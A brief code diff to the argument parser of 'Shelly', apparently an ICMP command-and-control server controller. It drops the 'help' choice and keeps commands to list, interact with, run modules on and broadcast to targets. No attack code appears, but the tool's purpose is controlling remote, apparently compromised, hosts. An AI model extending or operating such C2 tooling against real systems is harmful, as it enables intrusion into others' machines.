@@ -133,7 +133,7 @@ def main():
     parser = ArgumentParser(
                     prog='Shelly',
                     description='ICMP C2 Server Controller')
-    parser.add_argument('command', choices=["help", "ls", "interact", "run", "broadcast"], help='The command to execute')
+    parser.add_argument('command', choices=["ls", "interact", "run", "broadcast"], help='The command to execute')
     parser.add_argument('-t', '--target', choices=[target['id'] for target in controller.db.all()], help='The target to interact with/run modules on. Specifying \'*\' will select ALL targets.')  
     args = parser.parse_args()
 
